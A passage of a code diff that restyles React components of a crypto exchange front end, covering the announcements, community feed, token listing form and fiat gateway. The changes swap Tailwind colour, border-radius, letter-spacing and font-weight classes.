                                                                 onClick={() => handleTradeSpotlight(t.symbol)}
-                                                                className="w-full md:w-auto px-6 py-3 bg-purple-500 text-white rounded-xl font-black text-[10px] uppercase tracking-[0.2em] shadow-lg shadow-purple-500/20 hover:bg-purple-600 active:scale-95 transition-all whitespace-nowrap"
+                                                                className="w-full md:w-auto px-6 py-3 bg-purple-500 text-white rounded-xl font-black text-[10px] uppercase tracking-wide shadow-lg shadow-purple-500/20 hover:bg-purple-600 active:scale-95 transition-all whitespace-nowrap"
                                                             >
                                                                 Trade {t.symbol}
                                                             </button>
@@ -2492,11 +2800,11 @@ const AnnouncementsPortal = ({ setMode, setToToken, tokens }) => {
                                             <div className="p-4 bg-purple-50/50 border border-purple-100 rounded-2xl flex flex-wrap sm:flex-nowrap items-center justify-between gap-4 group/token hover:bg-purple-100/50 transition-all">
                                                 <div className="flex items-center gap-4 min-w-0">
                                                     <div className="w-12 h-12 bg-white p-2 rounded-xl shadow-sm border border-purple-100 flex items-center justify-center group-hover/token:scale-110 transition-transform shrink-0">
-                                                        {a.token_logo ? <img src={a.token_logo} className="w-full h-full object-contain" alt="" /> : <div className="w-full h-full bg-gray-50 flex items-center justify-center text-[8px] text-gray-300">LOGO</div>}
+                                                        {a.token_logo ? <img src={a.token_logo} className="w-full h-full object-contain" alt="" /> : <div className="w-full h-full bg-slate-50 flex items-center justify-center text-[8px] text-gray-300">LOGO</div>}
                                                     </div>
                                                     <div className="min-w-0">
                                                         <div className="flex items-center gap-2 flex-wrap">
-                                                            <p className="text-sm font-black text-gray-900 leading-none truncate">{a.token_symbol}</p>
+                                                            <p className="text-sm font-black text-slate-900 leading-none truncate">{a.token_symbol}</p>
                                                             <span className="px-1.5 py-0.5 bg-purple-500 text-white text-[7px] font-black rounded shrink-0">LIVE</span>
                                                         </div>
                                                         <p className="text-[9px] font-black text-purple-500 uppercase tracking-widest mt-1 truncate">{a.token_name}</p>
@@ -2504,7 +2812,7 @@ const AnnouncementsPortal = ({ setMode, setToToken, tokens }) => {
                                                 </div>
                                                 <button 
                                                     onClick={() => handleTradeSpotlight(a.token_symbol)}
-                                                    className="w-full sm:w-auto px-5 py-2.5 bg-purple-500 text-white text-[9px] font-black uppercase tracking-[0.2em] rounded-xl shadow-md shadow-purple-500/20 hover:scale-105 active:scale-95 transition-all shrink-0"
+                                                    className="w-full sm:w-auto px-5 py-2.5 bg-purple-500 text-white text-[9px] font-bold uppercase tracking-wide rounded-xl shadow-md shadow-purple-500/20 hover:scale-105 active:scale-95 transition-all shrink-0"
                                                 >
                                                     Trade Now
                                                 </button>
@@ -2513,7 +2821,7 @@ const AnnouncementsPortal = ({ setMode, setToToken, tokens }) => {
                                     )}
                                 </div>
 
-                                <div className="mt-6 pt-4 border-t border-gray-100 flex items-center justify-between text-gray-400">
+                                <div className="mt-6 pt-4 border-t border-slate-200/60 flex items-center justify-between text-slate-400">
                                     <span className="text-[9px] font-bold uppercase tracking-widest flex items-center gap-2">
                                         <Clock className="w-3 h-3" /> {new Date(a.created_at).toLocaleString()}
                                     </span>
@@ -2580,22 +2888,22 @@ const CommunityPortal = () => {
     };
 
     return (
-        <div className="bg-white/50 backdrop-blur-3xl border border-gray-100 rounded-[3rem] p-8 md:p-12 shadow-3xl shadow-amber-900/5 min-h-[500px]">
-            <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-12 border-b border-gray-100 pb-8">
+        <div className="bg-white/50 backdrop-blur-3xl border border-slate-200/60 rounded-2xl p-8 md:p-8 shadow-3xl shadow-indigo-900/5 min-h-[500px]">
+            <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-12 border-b border-slate-200/60 pb-8">
                 <div className="flex items-center gap-6">
                     <div className="w-16 h-16 bg-blue-500 text-white rounded-2xl flex items-center justify-center shadow-xl shadow-blue-500/20">
                         <MessageSquare className="w-8 h-8" />
                     </div>
                     <div>
-                        <h2 className="text-3xl font-black text-gray-900 uppercase tracking-tighter">B20 Community Nexus</h2>
-                        <p className="text-xs font-black text-blue-500 uppercase tracking-[0.3em] mt-1">Live Institutional Sentiment</p>
+                        <h2 className="text-3xl font-black text-slate-900 uppercase tracking-tighter">B20 Community Nexus</h2>
+                        <p className="text-xs font-black text-blue-500 uppercase tracking-wider mt-1">Live Institutional Sentiment</p>
                     </div>
                 </div>
             </div>
 
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-10">
-                <div className="lg:col-span-1 border-r border-gray-100 pr-0 lg:pr-10">
-                    <h4 className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-4">Compose Broadcast</h4>
+                <div className="lg:col-span-1 border-r border-slate-200/60 pr-0 lg:pr-10">
+                    <h4 className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-4">Compose Broadcast</h4>
                     <div className="space-y-4">
                         <div className="flex items-center gap-2 mb-2">
                              <ShieldCheck className="w-3 h-3 text-blue-500" />
@@ -2611,12 +2919,12 @@ const CommunityPortal = () => {
                                 }
                             }}
                             placeholder="Share market intelligence... Press Enter to post. Note: 0x-Redact automatically sanitizes PII (Emails/Phones) for node security."
-                            className="w-full h-40 bg-white border border-gray-200 rounded-3xl p-6 font-medium text-sm outline-none focus:border-blue-500/50 transition-all resize-none shadow-sm"
+                            className="w-full h-40 bg-white border border-gray-200 rounded-xl p-6 font-medium text-sm outline-none focus:border-blue-500/50 transition-all resize-none shadow-sm"
                         />
                         <button 
                             onClick={handlePost}
                             disabled={submitting || !content.trim()}
-                            className="w-full py-5 bg-blue-500 text-white rounded-2xl font-black text-xs uppercase tracking-[0.2em] shadow-xl shadow-blue-500/20 hover:bg-blue-600 transition-all disabled:opacity-50 flex items-center justify-center gap-3"
+                            className="w-full py-5 bg-blue-500 text-white rounded-2xl font-black text-xs uppercase tracking-wide shadow-xl shadow-blue-500/20 hover:bg-blue-600 transition-all disabled:opacity-50 flex items-center justify-center gap-3"
                         >
                             {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : 'Transmit Broadcast'}
                         </button>
@@ -2624,29 +2932,29 @@ const CommunityPortal = () => {
                 </div>
 
                 <div className="lg:col-span-2">
-                    <h4 className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-6 border-b border-gray-100 pb-4">Live Terminal Feed</h4>
+                    <h4 className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-6 border-b border-slate-200/60 pb-4">Live Terminal Feed</h4>
                     {loading ? (
-                        <div className="flex justify-center items-center py-20 text-gray-400">
+                        <div className="flex justify-center items-center py-20 text-slate-400">
                             <Loader2 className="w-6 h-6 animate-spin" />
                         </div>
                     ) : (
                         <div className="space-y-6 max-h-[600px] overflow-y-auto pr-4 custom-scrollbar">
                             {posts.map(p => (
-                                <div key={p.id} className="p-6 bg-white rounded-3xl border border-gray-100 shadow-sm flex flex-col gap-4">
+                                <div key={p.id} className="p-6 bg-white rounded-xl border border-slate-200/60 shadow-sm flex flex-col gap-4">
                                     <div className="flex items-center justify-between">
                                         <div className="flex items-center gap-3">
                                             <div className="w-8 h-8 rounded-xl bg-gradient-to-br from-blue-100 to-indigo-100 flex items-center justify-center">
                                                 <User className="w-4 h-4 text-blue-500" />
                                             </div>
-                                            <span className="font-black text-gray-900 font-mono tracking-wider">{maskWallet(p.wallet_address)}</span>
+                                            <span className="font-black text-slate-900 font-mono tracking-wider">{maskWallet(p.wallet_address)}</span>
                                         </div>
-                                        <span className="text-[9px] font-bold text-gray-400 uppercase tracking-widest">{new Date(p.created_at).toLocaleString()}</span>
+                                        <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest">{new Date(p.created_at).toLocaleString()}</span>
                                     </div>
                                     <p className="text-gray-700 text-sm leading-relaxed whitespace-pre-wrap pl-11">{p.content}</p>
                                 </div>
                             ))}
                             {posts.length === 0 && (
-                                <div className="text-center py-10 bg-gray-50 rounded-3xl border border-gray-100 text-gray-400 font-bold uppercase tracking-widest text-[10px]">
+                                <div className="text-center py-10 bg-slate-50 rounded-xl border border-slate-200/60 text-slate-400 font-bold uppercase tracking-widest text-[10px]">
                                     No node transmissions detected. Be the first to broadcast.
                                 </div>
                             )}
@@ -2709,37 +3017,37 @@ const ListingPortal = () => {
 
     if (status === 'success') {
         return (
-            <div className="bg-white shadow-3xl shadow-amber-900/5 border border-gray-100 rounded-[3rem] p-16 text-center flex flex-col items-center gap-8">
+            <div className="bg-white shadow-3xl shadow-indigo-900/5 border border-slate-200/60 rounded-2xl p-16 text-center flex flex-col items-center gap-8">
                 <div className="w-24 h-24 bg-emerald-500 text-white rounded-[2rem] flex items-center justify-center shadow-2xl shadow-emerald-500/20">
                     <Check className="w-12 h-12" />
                 </div>
                 <div>
-                    <h3 className="text-4xl font-black text-gray-900 uppercase tracking-tighter mb-4">Application Submitted</h3>
-                    <p className="text-sm font-bold text-gray-400 uppercase tracking-widest leading-relaxed">
+                    <h3 className="text-4xl font-black text-slate-900 uppercase tracking-tighter mb-4">Application Submitted</h3>
+                    <p className="text-sm font-bold text-slate-400 uppercase tracking-widest leading-relaxed">
                         Your listing details have been routed to the Admin panel. Once approved by the core team, your token will automatically be launched and go LIVE for trading in the Launchpad.
                     </p>
                 </div>
-                <button onClick={() => window.location.reload()} className="px-12 py-5 bg-gray-900 text-white rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-amber-500 transition-all shadow-xl">Back to Markets</button>
+                <button onClick={() => window.location.reload()} className="px-12 py-5 bg-gray-900 text-white rounded-2xl font-black text-xs uppercase tracking-widest hover:bg-indigo-600 transition-all shadow-xl">Back to Markets</button>
             </div>
         );
     }
 
     return (
-        <div className="bg-white shadow-3xl shadow-amber-900/5 border border-gray-100 rounded-[3rem] overflow-hidden">
-            <div className="p-12 relative">
+        <div className="bg-white shadow-3xl shadow-indigo-900/5 border border-slate-200/60 rounded-2xl overflow-hidden">
+            <div className="p-8 relative">
                 <div className="absolute top-0 right-0 p-16 opacity-5 rotate-12 pointer-events-none">
                     <Rocket className="w-64 h-64" />
                 </div>
 
                 <div className="relative z-10 w-full mb-10">
-                    <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 border-b border-gray-100 pb-10">
+                    <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 border-b border-slate-200/60 pb-10">
                         <div className="flex items-center gap-6">
-                            <div className="w-16 h-16 bg-amber-500 text-white rounded-2xl flex items-center justify-center shadow-xl shadow-amber-500/20">
+                            <div className="w-16 h-16 bg-indigo-600 text-white rounded-2xl flex items-center justify-center shadow-xl shadow-indigo-500/20">
                                 <PlusCircle className="w-8 h-8" />
                             </div>
                             <div>
-                                <h2 className="text-3xl font-black text-gray-900 uppercase tracking-tighter">List Your Asset</h2>
-                                <p className="text-xs font-black text-amber-500 uppercase tracking-[0.3em] mt-1">Global Launchpad Access</p>
+                                <h2 className="text-3xl font-black text-slate-900 uppercase tracking-tighter">List Your Asset</h2>
+                                <p className="text-xs font-black text-indigo-600 uppercase tracking-wider mt-1">Global Launchpad Access</p>
                             </div>
                         </div>
                         <div className="bg-rose-50 border-2 border-rose-100 p-4 rounded-xl flex items-center gap-4 max-w-sm">
@@ -2748,7 +3056,7 @@ const ListingPortal = () => {
                                 <p className="text-[9px] font-black text-rose-500 uppercase tracking-widest">Mandatory Requirement</p>
                                 <p className="text-xs font-semibold text-rose-900 leading-tight mt-0.5">Your token MUST have PancakeSwap Liquidity to list.</p>
                             </div>
-                            <a href="https://pancakeswap.finance/liquidity" target="_blank" rel="noopener noreferrer" className="ml-auto px-4 py-2 bg-rose-500 text-white text-[10px] font-black uppercase tracking-widest rounded-lg shadow-md hover:bg-rose-600 transition-all text-center">
+                            <a href="https://pancakeswap.finance/liquidity" target="_blank" rel="noopener noreferrer" className="ml-auto px-4 py-2 bg-rose-500 text-white text-[10px] font-bold uppercase tracking-widest rounded-lg shadow-md hover:bg-rose-600 transition-all text-center">
                                 Add LP
                             </a>
                         </div>
@@ -2757,26 +3065,26 @@ const ListingPortal = () => {
 
                 <form onSubmit={handleListing} className="relative z-10 space-y-8">
                     {/* Primary Asset Info */}
-                    <div className="bg-gray-50/50 border border-gray-100 p-8 rounded-[2rem] space-y-6">
-                        <h4 className="text-[10px] font-black text-gray-400 uppercase tracking-widest border-b border-gray-200 pb-2">1. Core Information</h4>
+                    <div className="bg-slate-50/50 border border-slate-200/60 p-8 rounded-[2rem] space-y-6">
+                        <h4 className="text-[10px] font-black text-slate-400 uppercase tracking-widest border-b border-gray-200 pb-2">1. Core Information</h4>
                         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                             <div className="space-y-2">
                                 <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Contract Address *</label>
-                                <input required type="text" value={formData.address} onChange={(e) => setFormData({...formData, address: e.target.value})} placeholder="0x..." className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-amber-500/50" />
+                                <input required type="text" value={formData.address} onChange={(e) => setFormData({...formData, address: e.target.value})} placeholder="0x..." className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-indigo-500/50" />
                             </div>
                             <div className="space-y-2">
                                 <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Token Name *</label>
-                                <input required type="text" value={formData.name} onChange={(e) => setFormData({...formData, name: e.target.value})} placeholder="e.g. B20 Gold" className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-amber-500/50" />
+                                <input required type="text" value={formData.name} onChange={(e) => setFormData({...formData, name: e.target.value})} placeholder="e.g. B20 Gold" className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-indigo-500/50" />
                             </div>
                             <div className="space-y-2">
                                 <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Token Symbol *</label>
-                                <input required type="text" value={formData.symbol} onChange={(e) => setFormData({...formData, symbol: e.target.value})} placeholder="e.g. B20G" className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-amber-500/50 uppercase" />
+                                <input required type="text" value={formData.symbol} onChange={(e) => setFormData({...formData, symbol: e.target.value})} placeholder="e.g. B20G" className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-indigo-500/50 uppercase" />
                             </div>
                         </div>
 
                         <div className="space-y-2">
                             <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Asset Description</label>
-                            <textarea required rows="3" value={formData.description} onChange={(e) => setFormData({...formData, description: e.target.value})} placeholder="Describe your project..." className="w-full bg-white border border-gray-200 rounded-[2rem] p-6 font-bold text-sm outline-none focus:border-amber-500/50 resize-none"></textarea>
+                            <textarea required rows="3" value={formData.description} onChange={(e) => setFormData({...formData, description: e.target.value})} placeholder="Describe your project..." className="w-full bg-white border border-gray-200 rounded-[2rem] p-6 font-bold text-sm outline-none focus:border-indigo-500/50 resize-none"></textarea>
                         </div>
 
                         <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
@@ -2785,7 +3093,7 @@ const ListingPortal = () => {
                                     <span>Project Logo URL *</span>
                                 </label>
                                 <div className="flex gap-4 items-center">
-                                    <div className="w-16 h-16 rounded-xl border border-gray-100 overflow-hidden shrink-0 shadow-sm bg-gray-50">
+                                    <div className="w-16 h-16 rounded-xl border border-slate-200/60 overflow-hidden shrink-0 shadow-sm bg-slate-50">
                                         {formData.logoUrl ? (
                                             <img src={formData.logoUrl} alt="Preview" className="w-full h-full object-cover" onError={(e) => { e.target.src='/placeholder.png'; }} />
                                         ) : (
@@ -2795,34 +3103,34 @@ const ListingPortal = () => {
                                         )}
                                     </div>
                                     <div className="flex-1 space-y-1">
-                                        <input required type="text" value={formData.logoUrl} onChange={(e) => setFormData({...formData, logoUrl: e.target.value})} placeholder="https://..." className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-amber-500/50" />
-                                        <p className="text-[9px] text-amber-600 font-black ml-2 uppercase tracking-tighter">Required: Square JPEG or PNG (512x512 pixels)</p>
+                                        <input required type="text" value={formData.logoUrl} onChange={(e) => setFormData({...formData, logoUrl: e.target.value})} placeholder="https://..." className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-indigo-500/50" />
+                                        <p className="text-[9px] text-indigo-600 font-black ml-2 uppercase tracking-tighter">Required: Square JPEG or PNG (512x512 pixels)</p>
                                     </div>
                                 </div>
                             </div>
                             <div className="space-y-2">
                                 <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Whitepaper URL</label>
-                                <input type="text" value={formData.whitepaperUrl} onChange={(e) => setFormData({...formData, whitepaperUrl: e.target.value})} placeholder="https://..." className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-amber-500/50" />
-                                <p className="text-[9px] text-gray-400 font-bold ml-2 uppercase tracking-tighter">Optional: Link to technical documentation</p>
+                                <input type="text" value={formData.whitepaperUrl} onChange={(e) => setFormData({...formData, whitepaperUrl: e.target.value})} placeholder="https://..." className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-indigo-500/50" />
+                                <p className="text-[9px] text-slate-400 font-bold ml-2 uppercase tracking-tighter">Optional: Link to technical documentation</p>
                             </div>
                         </div>
                     </div>
 
                     {/* Supply & Liquidity */}
-                    <div className="bg-gray-50/50 border border-gray-100 p-8 rounded-[2rem] space-y-6">
-                        <h4 className="text-[10px] font-black text-gray-400 uppercase tracking-widest border-b border-gray-200 pb-2">2. Market & Liquidity Data</h4>
+                    <div className="bg-slate-50/50 border border-slate-200/60 p-8 rounded-[2rem] space-y-6">
+                        <h4 className="text-[10px] font-black text-slate-400 uppercase tracking-widest border-b border-gray-200 pb-2">2. Market & Liquidity Data</h4>
                         <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                             <div className="space-y-2">
                                 <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Total Circulation Supply *</label>
-                                <input required type="text" value={formData.circulationSupply} onChange={(e) => setFormData({...formData, circulationSupply: e.target.value})} placeholder="e.g. 1000000" className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-amber-500/50" />
+                                <input required type="text" value={formData.circulationSupply} onChange={(e) => setFormData({...formData, circulationSupply: e.target.value})} placeholder="e.g. 1000000" className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-indigo-500/50" />
                             </div>
                             <div className="space-y-2">
                                 <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Total Liquidity ($) *</label>
-                                <input required type="text" value={formData.totalLiquidity} onChange={(e) => setFormData({...formData, totalLiquidity: e.target.value})} placeholder="e.g. 50000" className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-amber-500/50" />
+                                <input required type="text" value={formData.totalLiquidity} onChange={(e) => setFormData({...formData, totalLiquidity: e.target.value})} placeholder="e.g. 50000" className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-indigo-500/50" />
                             </div>
                             <div className="space-y-2">
                                 <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Paired Token *</label>
-                                <select value={formData.pairedToken} onChange={(e) => setFormData({...formData, pairedToken: e.target.value})} className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-amber-500/50">
+                                <select value={formData.pairedToken} onChange={(e) => setFormData({...formData, pairedToken: e.target.value})} className="w-full bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-indigo-500/50">
                                     <option value="BNB">BNB / WBNB</option>
                                     <option value="USDT">USDT</option>
                                     <option value="BUSD">BUSD</option>
@@ -2838,8 +3146,8 @@ const ListingPortal = () => {
                     </div>
 
                     {/* Verification Checks */}
-                    <div className="bg-gray-50/50 border border-gray-100 p-8 rounded-[2rem] space-y-6">
-                        <h4 className="text-[10px] font-black text-gray-400 uppercase tracking-widest border-b border-gray-200 pb-2">3. Verification Status</h4>
+                    <div className="bg-slate-50/50 border border-slate-200/60 p-8 rounded-[2rem] space-y-6">
+                        <h4 className="text-[10px] font-black text-slate-400 uppercase tracking-widest border-b border-gray-200 pb-2">3. Verification Status</h4>
                         <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                             {[
                                 { label: 'BSC Scan Verified', key: 'bscVerified' },
@@ -2850,30 +3158,30 @@ const ListingPortal = () => {
                             ].map((item, idx) => (
                                 <button type="button" key={idx}
                                     onClick={() => setFormData({...formData, [item.key]: !formData[item.key]})}
-                                    className={`p-4 border rounded-2xl text-left transition-all ${formData[item.key] ? (item.highlight ? 'bg-indigo-50 border-indigo-200' : 'bg-emerald-50 border-emerald-200') : 'bg-white border-gray-200 hover:bg-gray-50'}`}>
+                                    className={`p-4 border rounded-2xl text-left transition-all ${formData[item.key] ? (item.highlight ? 'bg-indigo-50 border-indigo-200' : 'bg-emerald-50 border-emerald-200') : 'bg-white border-gray-200 hover:bg-slate-50'}`}>
                                     <div className="flex items-center justify-between mb-2">
                                         <div className={`w-5 h-5 rounded-full flex items-center justify-center border ${formData[item.key] ? (item.highlight ? 'bg-indigo-500 border-indigo-500 text-white' : 'bg-emerald-500 border-emerald-500 text-white') : 'bg-white border-gray-300'}`}>
                                             {formData[item.key] && <Check className="w-3 h-3" />}
                                         </div>
                                     </div>
-                                    <p className={`text-[10px] font-black uppercase tracking-widest ${formData[item.key] ? (item.highlight ? 'text-indigo-700' : 'text-emerald-700') : 'text-gray-500'}`}>{item.label}</p>
+                                    <p className={`text-[10px] font-bold uppercase tracking-widest ${formData[item.key] ? (item.highlight ? 'text-indigo-700' : 'text-emerald-700') : 'text-gray-500'}`}>{item.label}</p>
                                 </button>
                             ))}
                         </div>
-                        <div className="space-y-2 mt-4 pt-4 border-t border-gray-100">
+                        <div className="space-y-2 mt-4 pt-4 border-t border-slate-200/60">
                             <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Contact Email ID *</label>
-                            <input required type="email" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} placeholder="admin@project.com" className="w-full md:w-1/2 bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-amber-500/50" />
+                            <input required type="email" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} placeholder="admin@project.com" className="w-full md:w-1/2 bg-white border border-gray-200 rounded-2xl px-6 py-4 font-bold text-sm outline-none focus:border-indigo-500/50" />
                         </div>
                     </div>
 
                     <div className="p-8 bg-gray-900 border border-gray-800 rounded-[2rem] flex flex-col md:flex-row items-center justify-between gap-6">
                         <div>
-                            <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">Total Listing Fee</p>
+                            <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Total Listing Fee</p>
                             <p className="text-3xl font-black text-white tracking-tighter">0.10 BNB</p>
                         </div>
                         <button 
                             type="submit" disabled={status === 'processing'}
-                            className="w-full md:w-auto px-12 py-6 bg-amber-500 text-white rounded-2xl font-black text-sm uppercase tracking-widest hover:bg-amber-600 transition-all shadow-xl shadow-amber-500/20 disabled:opacity-50"
+                            className="w-full md:w-auto px-12 py-6 bg-indigo-600 text-white rounded-2xl font-black text-sm uppercase tracking-widest hover:bg-indigo-600 transition-all shadow-xl shadow-indigo-500/20 disabled:opacity-50"
                         >
                             {status === 'processing' ? 'PROCESSING...' : 'PAY & SUBMIT LISTING'}
                         </button>
@@ -2908,34 +3216,34 @@ const FiatPortal = () => {
     };
 
     return (
-        <div className="bg-white shadow-3xl shadow-emerald-900/5 border border-gray-100 rounded-[3rem] p-12 overflow-hidden relative">
+        <div className="bg-white shadow-3xl shadow-emerald-900/5 border border-slate-200/60 rounded-2xl p-8 overflow-hidden relative">
             <div className="absolute -top-20 -right-20 p-16 opacity-5 pointer-events-none">
                 <Globe className="w-96 h-96" />
             </div>
             
             <div className="relative z-10 max-w-xl mx-auto">
                 <div className="flex items-center justify-center gap-4 mb-8">
-                    <div className="w-16 h-16 bg-emerald-500 rounded-3xl flex items-center justify-center text-white shadow-2xl shadow-emerald-500/20">
+                    <div className="w-16 h-16 bg-emerald-500 rounded-xl flex items-center justify-center text-white shadow-2xl shadow-emerald-500/20">
                         <Globe className="w-8 h-8" />
                     </div>
                 </div>
                 <div className="text-center mb-10">
-                    <h2 className="text-3xl font-black text-gray-900 uppercase tracking-tighter">Global Fiat Gateway</h2>
-                    <p className="text-xs font-bold text-gray-400 uppercase tracking-widest mt-2">Zero-fee on-ramp pipeline into B20 Exchange</p>
+                    <h2 className="text-3xl font-black text-slate-900 uppercase tracking-tighter">Global Fiat Gateway</h2>
+                    <p className="text-xs font-bold text-slate-400 uppercase tracking-widest mt-2">Zero-fee on-ramp pipeline into B20 Exchange</p>
                 </div>
 
-                <div className="bg-gray-50 border border-gray-100 p-2 rounded-2xl flex gap-2 mb-8">
-                    <button onClick={() => setTab('buy')} className={`flex-1 py-4 text-xs font-black uppercase tracking-widest rounded-xl transition-all ${tab === 'buy' ? 'bg-white text-emerald-600 shadow-sm border border-emerald-100' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-100/50'}`}>Buy Crypto</button>
-                    <button onClick={() => setTab('sell')} className={`flex-1 py-4 text-xs font-black uppercase tracking-widest rounded-xl transition-all ${tab === 'sell' ? 'bg-white text-rose-600 shadow-sm border border-rose-100' : 'text-gray-400 hover:text-gray-900 hover:bg-gray-100/50'}`}>Sell for Fiat</button>
+                <div className="bg-slate-50 border border-slate-200/60 p-2 rounded-2xl flex gap-2 mb-8">
+                    <button onClick={() => setTab('buy')} className={`flex-1 py-4 text-xs font-bold uppercase tracking-widest rounded-xl transition-all ${tab === 'buy' ? 'bg-white text-emerald-600 shadow-sm border border-emerald-100' : 'text-slate-400 hover:text-slate-900 hover:bg-gray-100/50'}`}>Buy Crypto</button>
+                    <button onClick={() => setTab('sell')} className={`flex-1 py-4 text-xs font-bold uppercase tracking-widest rounded-xl transition-all ${tab === 'sell' ? 'bg-white text-rose-600 shadow-sm border border-rose-100' : 'text-slate-400 hover:text-slate-900 hover:bg-gray-100/50'}`}>Sell for Fiat</button>
                 </div>
 
                 <form onSubmit={handleFiatTransaction} className="space-y-6">
-                    <div className="p-8 bg-white border border-gray-100 rounded-[2rem] shadow-sm space-y-6">
+                    <div className="p-8 bg-white border border-slate-200/60 rounded-[2rem] shadow-sm space-y-6">
                         <div className="space-y-4">
-                            <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-4">{tab === 'buy' ? 'You Pay' : 'You Sell'}</label>
+                            <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-4">{tab === 'buy' ? 'You Pay' : 'You Sell'}</label>
                             <div className="flex gap-4">
-                                <input required type="number" step="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="flex-1 bg-gray-50 border border-gray-100 rounded-2xl px-6 py-5 text-2xl font-black text-gray-900 outline-none focus:bg-white focus:border-emerald-500/30 transition-all" />
-                                <select value={tab === 'buy' ? fiatCurrency : cryptoAsset} onChange={(e) => tab === 'buy' ? setFiatCurrency(e.target.value) : setCryptoAsset(e.target.value)} className="w-32 bg-gray-50 border border-gray-100 rounded-2xl px-4 py-5 font-black text-sm outline-none focus:bg-white focus:border-emerald-500/30">
+                                <input required type="number" step="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="flex-1 bg-slate-50 border border-slate-200/60 rounded-2xl px-6 py-5 text-2xl font-black text-slate-900 outline-none focus:bg-white focus:border-emerald-500/30 transition-all" />
+                                <select value={tab === 'buy' ? fiatCurrency : cryptoAsset} onChange={(e) => tab === 'buy' ? setFiatCurrency(e.target.value) : setCryptoAsset(e.target.value)} className="w-32 bg-slate-50 border border-slate-200/60 rounded-2xl px-4 py-5 font-black text-sm outline-none focus:bg-white focus:border-emerald-500/30">
                                     {tab === 'buy' ? Object.keys(rates).map(c => <option key={c} value={c}>{c}</option>) : Object.keys(cryptoRates).map(c => <option key={c} value={c}>{c}</option>)}
                                 </select>
                             </div>
@@ -2943,17 +3251,17 @@ const FiatPortal = () => {
 
                         <div className="flex justify-center -my-2 opacity-50">
                             <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center -rotate-90">
-                                <ArrowLeftRight className="w-4 h-4 text-gray-400" />
+                                <ArrowLeftRight className="w-4 h-4 text-slate-400" />
                             </div>
                         </div>
 
                         <div className="space-y-4">
-                            <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-4">{tab === 'buy' ? 'You Receive (Estimated)' : 'You Receive (Fiat)'}</label>
+                            <label className="text-[10px] font-black text-slate-400 uppercase tracking-widest ml-4">{tab === 'buy' ? 'You Receive (Estimated)' : 'You Receive (Fiat)'}</label>
                             <div className="flex gap-4">
-                                <div className="flex-1 bg-gray-50/50 border border-gray-100 rounded-2xl px-6 py-5 text-2xl font-black text-gray-400 select-none overflow-hidden text-ellipsis whitespace-nowrap">
+                                <div className="flex-1 bg-slate-50/50 border border-slate-200/60 rounded-2xl px-6 py-5 text-2xl font-black text-slate-400 select-none overflow-hidden text-ellipsis whitespace-nowrap">
                                     {estimatedValue()}
                                 </div>
-                                <select value={tab === 'buy' ? cryptoAsset : fiatCurrency} onChange={(e) => tab === 'buy' ? setCryptoAsset(e.target.value) : setFiatCurrency(e.target.value)} className="w-32 bg-gray-50 border border-gray-100 rounded-2xl px-4 py-5 font-black text-sm outline-none focus:bg-white focus:border-emerald-500/30">
